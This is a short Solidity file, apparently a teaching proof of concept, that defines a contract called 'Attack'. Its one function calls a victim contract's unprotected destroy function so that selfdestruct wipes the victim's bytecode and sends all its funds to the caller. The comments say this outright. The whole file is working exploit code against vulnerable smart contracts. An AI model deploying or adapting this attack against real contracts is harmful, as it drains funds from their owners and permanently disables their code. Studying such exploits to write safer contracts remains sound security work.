// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.12;

contract Attack {
    // This function will call the destroy function.
    // the destroy function uses selfdestruct keyword
    // selfdestruct removes the bytecode from the blockchain and makes it unusable and send all the contract funds to the caller
    function attack(address _victim) external {
        address me = msg.sender;
        _victim.call(abi.encodeWithSignature("destroy(address)", me));
    }
}
